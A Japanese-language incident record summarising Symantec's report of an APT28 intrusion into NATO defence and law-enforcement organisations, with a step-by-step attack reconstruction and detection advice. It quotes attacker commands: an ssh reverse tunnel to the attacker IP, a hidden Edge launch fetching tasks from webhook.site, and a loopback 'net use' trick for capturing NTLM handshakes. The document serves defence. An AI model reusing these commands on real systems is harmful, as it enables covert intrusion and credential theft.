INC-2026-0623APT28がNATO2か国の防衛企業に滞留

Symantec が2026年10月20日に公表したロシア GRU 系 Swallowtail（APT28）の作戦は、NATO 加盟2か国の 法執行機関・軍用航空機エンジン製造・海軍艦艇造船の3組織を狙い、造船会社では2026年7月24日に開いた マクロ付き Word 文書を起点に少なくとも2か月（9月24日まで痕跡を確認）滞留した——操作員は SSH 秘密鍵を 送り込んで自前サーバーへ恒久的な逆トンネルを張り、ループバックへの強制認証で NTLM ハンドシェイクも奪い、 未文書化のリフレクティブローダー ld.exe を投入していた

脅威・攻撃キャンペーン不正アクセス・侵害初報のみ有名事象として記録（日本と直接の関係は薄い）人を介した誘導（ビッシング・BEC）認証情報の悪用（使い回し・推測可能・窃取）設計・実装上の不備
初報: 2026年10月20日 最終更新: 2026年10月20日

Symantec の Threat Hunter Team は2026年10月20日、ロシアのサイバースパイ集団Swallowtail（別称 APT28・Fancy Bear・Forest Blizzard）がNATO 加盟2か国の3組織——法執行機関・軍用航空機エンジンの製造企業・海軍艦艇の造船企業——を標的にしていたと公表した。Symantec は「米国政府によれば、同集団はロシア軍参謀本部情報総局（GRU）の一部隊である」（原文英語）としている。

最も深く追跡できたのは造船企業の事案である。2026年7月24日午後、Outlook の添付キャッシュからマクロ付き Word 文書が直接開かれた（受信メールの添付であったことの確認になる）。文書は VBA のソースと文字列を短い断片に割って実行時に結合する難読化を施し、Hookedge バックドアの連鎖を開始した。Hookedge はwebhook.site（正規の Webhook 検証サービス）でタスクを受け取り結果を返し、取得には1ピクセルに縮め画面外（座標10000,10000）へ飛ばしたMicrosoft Edge を使う。通常のダウンローダを使わず、ブラウザ自身を HTTP クライアントにしている。

3日の間隔をおいた7月27日朝、第2段が動いた。タスクの取得先は webhook.site から攻撃者専用の IP 185.82.218[.]119（443/tcp）に替わり、30秒間に7つのタスクが2〜8秒間隔で次々に届いた——固定間隔のポーリングではなく操作員が対話的に叩いている速度である。操作員はSSH 秘密鍵を C:\ProgramData\Adobe\id_rsa として送り込み、icacls / cacls で所有者と権限を調整したうえで、Windows 標準同梱のC:\Windows\System32\OpenSSH\ssh.exe でポート80の自前サーバーへ接続し、-R 185.82.218.119:48097 -Nf で恒久的・バックグラウンドの逆トンネルを張った。これは単発のリモート操作ではなく、攻撃者のインフラから被害組織の内部ネットワークへ入る経路である。直後に内部ホスト名の DNS 参照が走っており、トンネルは立ち上がった時点から内部探索に使われている。

認証情報の窃取はもう1系統あった。ループバック（http://localhost:8080/）に HttpListener を立て、net use f: \\localhost@8080\c$ を背後で走らせて自分自身に SMB 認証させ、NTLM ハンドシェイクを捕捉する PowerShell である。さらに未文書化のリフレクティブローダー ld.exe が投入された。暗号化ファイルと復号鍵をコマンドライン引数で受け取り、メモリ上で復号して ExecuteLoader を呼ぶ。Symantec はこの実行で使われた鍵と暗号化ファイル名（Events.dat）までは回収したが、ペイロード本体は回収できておらず、最終的に何をするものかは不明である。

侵入は造船企業で少なくとも2か月続いた。操作員の明示的なコマンドは7月末で止まるが、同じ ld.exe のハッシュと同じ VBS ランチャーが約4週間後の8月下旬にもホスト上に残っており、ランチャーは9月24日にもう一度観測された。 Symantec は「元のスケジュールタスクが発火し続けて大半はタスクが無かっただけなのか、その後に操作員の関心が戻ったのかは、手元のデータからは判断できない」（原文英語）としている。Symantec は侵害を「終わったもの」ではなく「継続中かもしれないもの」として扱い、バックドアの存在だけでなく認証情報の窃取とトンネルの痕跡を探せと勧告している。

攻撃の経過

公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。

**正規のものだけで構成された侵害である。** 入口はメール添付のマクロ付き Word 文書。 タスクの取得は**1ピクセル・画面外に飛ばした Microsoft Edge**（ブラウザを HTTP クライアントとして使う）、 第1段の C2 は**webhook.site という正規の検証サービス**、 認証情報の窃取と内部への経路は**Windows 標準同梱の `ssh.exe`** による ポート80の逆トンネル、もう1系統は**ループバックへの SMB 強制認証**による NTLM 捕捉。 唯一の独自バイナリは未文書化のリフレクティブローダー `ld.exe` だが、 これも**暗号化ペイロードと鍵を引数で受け取る形**で、鍵が無ければ中身は動かない。 **「不審な実行ファイル」を探す検知は、この連鎖のほとんどを素通りする**（本記録の評価）

  1. 1. 初期侵入disclosed[1]
    利用者が**受信メールに添付されたマクロ付き Word 文書**を開く。 マクロは VBA のソースと文字列を短い断片に割り、実行時に結合する難読化を施していた （静的なアンチウイルススキャンを破るための手口）。 `AutoOpen` が4つのファイル——VBScript ランチャー、 **読み込まれた瞬間に隠しフォームを webhook エンドポイントへ自動送信する HTML/XHTML の対**、 バッチスクリプト——を利用者プロファイルへ落とす
    根拠: Outlook の添付キャッシュからの直接実行（受信添付であることの確認）、 難読化された VBA マクロ、AutoOpen が落とした4ファイル（出典1）
  2. 2. 実行disclosed[1]
    バッチスクリプトが**まず `taskkill /f /im msedge.exe` で稼働中の Edge を落とし**、 `%userprofile%\Downloads` の古いダウンロード残骸（`*.000` / `*.tmp` / `*.crdownload`）を 削除したうえで、**`--window-size=1,1 --window-position=10000,10000` （1ピクセル・画面外）の Edge を、URL ではなく `data:text/html;base64,` の形で base64 符号化した JavaScript を引数に起動する。** その JavaScript は webhook.site のエンドポイントから取得した内容を、 自動クリックさせた `<a download>` 経由で同じ識別子のファイル名でディスクに保存する—— **ブラウザ自身をダウンローダとして使っている。** 少し待ってからバッチが保存物を `.cmd` にコピーして実行し、 出力を同じ webhook エンドポイントへ送り返して一時ファイルを消す
    根拠: 復元されたバッチスクリプトと、復号した JavaScript （`fetch('https://webhook.site/890efd8d-...')` → blob 保存）（出典1）

    根拠: 5つの webhook.site エンドポイント URL、IP `185.82.218[.]119`、 復元されたタスクテンプレート（出典1）

Symantec の Threat Hunter Team が2026年10月20日に公表したところによれば、起きていたことは次のとおりである。

  • Swallowtail（APT28 / Fancy Bear / Forest Blizzard）が、NATO 加盟2か国の法執行機関・軍用航空機エンジン製造企業・海軍艦艇造船企業を標的にしていた

  • 操作員は30秒間に7つのタスクを2〜8秒間隔で送り込んでおり、これは人手による対話的な作業の速度である

  • 未文書化のリフレクティブローダー ld.exe が投入されたが、暗号化ペイロード本体は回収できておらず、最終目的は不明である

Symantec が強調しているのは、これまで公に報じられてきたのが配送の仕組みまでだったという点である。Hookedge 自体は Recorded Future の Insikt Group が2026年8月に文書化していた。本公表の値は、バックドアが入った後に何が行われたかにある。

使われた道具のほとんどが正規のものだった——Edge・webhook.site・Windows 同梱の ssh.exe原因・手口

この侵害の特徴は、独自のマルウェアに依存していないことである。

タスクの取得はブラウザが行う。 バッチスクリプトは稼働中の Edge をtaskkill /f /im msedge.exe で落とし、Downloads の古い残骸を消したうえで、1ピクセル・画面外（座標10000,10000）に配置した Edge を起動する。渡すのは URL ではなく data:text/html;base64, 形式の JavaScript で、その中身は webhook.site からの取得と <a download> の自動クリックによる保存だけである。専用のダウンローダを持たないため、「不審な実行ファイルのネットワーク通信」を探す検知には引っかからない。

第1段の C2 は webhook.site である。 開発者が Webhook を検証するための正規サービスで、ドメインもTLS も正当である。レピュテーションでは止まらない。

内部への経路は Windows 標準同梱の ssh.exe である。 C:\Windows\System32\OpenSSH\ssh.exe は Windows 10/11 に既定で含まれる。操作員はこれを -p 80（HTTP ポート）で自前サーバーに向け、ホスト鍵の検証を無効化し、旧来の RSA アルゴリズムを強制して接続を通し、-R 185.82.218.119:48097 -Nf で恒久的・バックグラウンドの逆トンネルを張った。-R にホスト名を伴わない素のポート番号を与えるのはSOCKS 形式の動的フォワードの要求であり、1つのポートを特定の内部サービスへ転送するのではなく、攻撃者側から任意の内部宛先へ出られる経路を作る。

唯一の独自バイナリが ld.exe だが、これも暗号化ファイルと復号鍵をコマンドライン引数で受け取る形である。復号後の先頭4バイトは ADSA（0x41534441）で、エクスポート関数 ExecuteLoader を呼ぶ。鍵が無ければ中身は動かないため、ファイルだけを回収しても解析できない。Symantec は該当実行の鍵と暗号化ファイル名（Events.dat）までは復元したが、ペイロード本体は回収できていない。

認証情報は2つの独立した手口で奪われ、どちらも「外部へ出す」形だった原因・手口

① SSH 秘密鍵の持ち込み。タスク配信と同じ「取得して改名する」流れで鍵ファイルを落とし、id_rsa に改名してC:\ProgramData\Adobe\（Adobe の正規フォルダ）に置く。icacls /setowner で所有者を、echo Y|cacls /G "<domain>\<user>:F" で権限を調整し、dir で反映を確認する——権限の調整を確認する手順を踏んでいることからも、自動化ではなく人手の作業だと分かる。

② ループバックへの強制認証による NTLM 捕捉。 PowerShell で http://localhost:8080/ に HttpListener を立て、Start-Job で net use f: \\localhost@8080\c$ を走らせる。ホスト自身が自分の立てた偽サーバーに対して SMB 認証を行い、そこで発生した NTLM ハンドシェイク（最大4回分）が捕捉される。ネットワークを一切またがないため、横方向の通信を見ている監視では検知できない。

この2つは独立していることに意味がある。片方を潰しても、もう片方が残る。Symantec が「バックドアの導入が活動の全てだと仮定せず、ここに書いた認証情報の窃取とトンネルの活動を探せ」（原文英語）と勧告しているのは、この構造を踏まえてのことである。

操作員のコマンドは7月末で止まったが、痕跡は8月下旬と9月24日に残っていた被害規模・影響範囲

明示的な操作員コマンドの最後は net user である。しかし Symantec は、同じ ld.exe のハッシュと同じ汎用 VBS ランチャーが約4週間後の8月下旬にもホスト上に残っており、ランチャーは9月24日にもう一度観測されたと記している。

そのうえで、「元のスケジュールタスクが発火し続けて、大半の時間は新しいタスクが無かっただけなのか、それともその後の時点で操作員の関心が戻ったのかは、手元のデータからは判断できない」（原文英語）と明記している。

この留保をそのまま運用上の判断に移すと、結論は1つになる（本記録の評価）——どちらであっても、7月末の時点で「終わった」と判断していれば間違いだった。 Symantec の勧告が「侵害を継続中かもしれないものとして扱え」であるのは、活動が止まって見えることと終息したことが別物だからである。

    取るべき行動 ①ブラウザのコマンドラインに **`data:` スキーム**や **`base64,`** が現れる起動を検知する ②**`--window-size=1,1`・`--window-position` の異常値**（画面外座標）を検知する ③`taskkill /f /im msedge.exe` が先行する一連の挙動を相関ルールにする ④`--ignore-certificate-errors` を含むブラウザ起動を検知する（本事案で使われている）

    取るべき行動 ①webhook.site・requestbin 系など**リクエスト検証サービスへの通信を既定で遮断**し、 必要な開発端末だけを例外にする ②**ドメイン名を伴わない生 IP 宛ての HTTPS 通信**を検知対象にする ③コマンドラインに **`curl -k` / `--insecure`** が現れる実行を検知する ④過去90日のプロキシ・DNS ログを**公表された webhook.site の5 URL と `185.82.218[.]119`** で遡って照合する
  • 独自バイナリは1本だけで、それも鍵が無ければ動かない形だった
